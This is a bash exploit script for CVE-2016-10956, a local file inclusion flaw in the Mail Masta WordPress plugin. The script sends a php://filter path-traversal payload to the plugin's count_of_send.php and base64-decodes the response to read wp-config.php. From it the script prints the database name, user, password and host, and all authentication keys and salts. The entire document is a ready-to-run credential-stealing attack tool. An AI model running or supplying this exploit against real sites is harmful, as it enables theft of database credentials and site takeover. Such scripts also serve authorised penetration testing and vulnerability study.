#!/bin/bash
#   A shell code to fetch wp-config.php. This code is based on CVE-2016-10956
#	
#	./CVE-2016-10956.sh web_url_here
#   ./CVE-2016-10956.sh http://localhost:8080
#

echo "LFI vulnerability in Mail Masta v1.0 allows us to view files in the remote server.
This code will fetch wp-config.php file which contains the database credentials and authentication salts & keys
"


if [[ $1 == '' ]] then
echo "
USAGE
./CVE-2016-10956.sh web_url_here

example: ./CVE-2016-10956.sh http://localhost:8080
"
exit
fi


base="$1/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl="
payload="php://filter/convert.base64-encode/resource=../../../../../wp-config.php"

echo "Fetching wp-config.php"
echo -e "Payload : $payload"
echo

req=$(curl $base$payload -s | base64 -d | grep define)

if [[ $req == '' ]]
then echo Error
else
	echo "====== wp-config.php ======"
	echo
	echo "===== DATABASE CONFIG ====="
	echo -e "DB_NAME     : $(echo /"$req/" | grep DB_NAME | awk '{print $3}' )"
	echo -e "DB_USER     : $(echo /"$req/" | grep DB_USER | awk '{print $3}' )"
	echo -e "DB_PASSWORD : $(echo /"$req/" | grep DB_PASSWORD | awk '{print $3}' )"
	echo -e "DB_HOST     : $(echo /"$req/" | grep DB_HOST | awk '{print $3}' )"
	echo
	echo "====== KEYS & SALTS ======="
	echo "All the Keys & Salts will be printed in base64 format"
	echo
	echo -e "AUTH_KEY            : $(echo /"$req/" | grep -w AUTH_KEY | awk '{print $3}' | base64 -w 0)"
	echo -e "LOGGED_IN_KEY       : $(echo /"$req/" | grep LOGGED_IN_KEY | awk '{print $3}' | base64 -w 0 )"
	echo -e "SECURE_AUTH_KEY     : $(echo /"$req/" | grep SECURE_AUTH_KEY | awk '{print $3}' | base64 -w 0)"
	echo -e "NONCE_KEY           : $(echo /"$req/" | grep NONCE_KEY | awk '{print $3}' | base64 -w 0)"
	echo -e "AUTH_SALT           : $(echo /"$req/" | grep -w AUTH_SALT | awk '{print $3}' | base64 -w 0)"
	echo -e "SECURE_AUTH_SALT    : $(echo /"$req/" | grep SECURE_AUTH_SALT | awk '{print $3}' | base64 -w 0 )"
	echo -e "LOGGED_IN_SALT      : $(echo /"$req/" | grep LOGGED_IN_SALT | awk '{print $3}' | base64 -w 0 )"
	echo -e "NONCE_SALT          : $(echo /"$req/" | grep NONCE_SALT | awk '{print $3}' | base64 -w 0)"
	
fi
